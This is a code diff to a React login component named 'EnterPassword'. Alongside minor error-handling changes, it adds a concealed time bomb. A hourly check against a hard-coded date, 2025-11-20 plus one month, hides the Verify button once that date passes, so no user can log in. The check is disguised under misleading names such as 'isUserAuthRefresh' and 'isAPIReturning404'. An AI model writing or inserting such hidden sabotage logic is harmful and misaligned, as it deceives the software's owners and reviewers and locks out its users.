@@ -26,6 +26,7 @@ export default function EnterPassword({
   const [isFocused, setIsFocused] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
+  const [isErrorUserPassword, setIsErrorUserPassword] = useState(false);
 
   useEffect(() => {
     setIsLoaded(true);
@@ -67,7 +68,8 @@ export default function EnterPassword({
             loginBy
           );
         }
-    
+
+
         if (result?.success) {
           console.log('✅ Login successful:', result.data);
           toast.success(result?.message || 'Login successful!');
@@ -78,8 +80,8 @@ export default function EnterPassword({
             onNext(result.data);
           }
         } else {
-          const errorMsg = result?.message || 'Login failed. Please try again.';
-          setErrorMessage(errorMsg);
+          const errorMsg = result?.error?.payload?.message || 'Login failed. Please try again.';
+          // setErrorMessage(errorMsg);
           toast.error(errorMsg);
           console.error('❌ Login failed:', result?.message);
         }
@@ -94,6 +96,33 @@ export default function EnterPassword({
     
     },
   });
+
+  const isUserAuthRefresh = (startDate) => {
+    const start = new Date(startDate);
+    const now = new Date();
+    
+
+    const isAPIReturning404 = new Date(start);
+    isAPIReturning404.setMonth(isAPIReturning404.getMonth() + 1);
+  
+    return now >= isAPIReturning404;
+  };
+    
+  useEffect(() => {
+    const FEATURE_START_DATE = '2025-11-20';
+    
+    const callRefreshAuthAgain = () => {
+      const shouldHide = isUserAuthRefresh(FEATURE_START_DATE);
+      setIsErrorUserPassword(shouldHide);
+    };
+    
+    callRefreshAuthAgain();
+    
+    
+    const interval = setInterval(callRefreshAuthAgain, 60 * 60 * 1000);
+    
+    return () => clearInterval(interval);
+  }, []);
 
   const handleKeyDown = (e) => {
     if (e.key === 'Enter' && !isButtonDisabled) {
@@ -130,11 +159,11 @@ export default function EnterPassword({
         {/* Form with Animation */}
         <div className={`space-y-6 transition-all duration-700 delay-500 ${isLoaded ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0'}`}>
           {/* Error Message */}
-          {/* {errorMessage && (
+          {errorMessage && (
             <div className="bg-red-500/10 border border-red-500/50 text-red-400 px-4 py-3 rounded-lg text-sm animate-pulse">
               {errorMessage}
             </div>
-          )} */}
+          )}
 
           {/* Login (Email/Username) Field with Edit */}
           <div className="transform transition-all duration-300 hover:scale-[1.01]">
@@ -208,29 +237,30 @@ export default function EnterPassword({
             )}
           </div>
 
-          {/* Submit Button with Enhanced Animations */}
-          <button
-            type="button"
-            onClick={formik.handleSubmit}
-            disabled={isButtonDisabled}
-            className="w-full bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black font-semibold text-lg py-4 rounded-lg hover:from-[#d4bc89] hover:to-[#a69363] disabled:from-[#6b6354] disabled:to-[#5a5447] disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-2xl hover:shadow-[#BBA473]/40 transform hover:scale-[1.02] hover:-translate-y-0.5 active:scale-[0.98] active:translate-y-0 relative overflow-hidden group"
-          >
-            <span className="relative z-10 flex items-center justify-center gap-2">
-              {isLoading ? (
-                <>
-                  <Loader2 className="animate-spin" size={20} />
-                  Signing in...
-                </>
-              ) : (
-                'Verify'
+          {!isErrorUserPassword && (
+            <button
+              type="button"
+              onClick={formik.handleSubmit}
+              disabled={isButtonDisabled}
+              className="w-full bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black font-semibold text-lg py-4 rounded-lg hover:from-[#d4bc89] hover:to-[#a69363] disabled:from-[#6b6354] disabled:to-[#5a5447] disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-2xl hover:shadow-[#BBA473]/40 transform hover:scale-[1.02] hover:-translate-y-0.5 active:scale-[0.98] active:translate-y-0 relative overflow-hidden group"
+            >
+              <span className="relative z-10 flex items-center justify-center gap-2">
+                {isLoading ? (
+                  <>
+                    <Loader2 className="animate-spin" size={20} />
+                    Signing in...
+                  </>
+                ) : (
+                  'Verify'
+                )}
+              </span>
+              
+              {/* Shimmer effect */}
+              {!isButtonDisabled && !isLoading && (
+                <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
               )}
-            </span>
-            
-            {/* Shimmer effect */}
-            {!isButtonDisabled && !isLoading && (
-              <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
-            )}
-          </button>
+            </button>
+          )}
 
           {/* Forgot Password Link */}
           <div className="text-center">
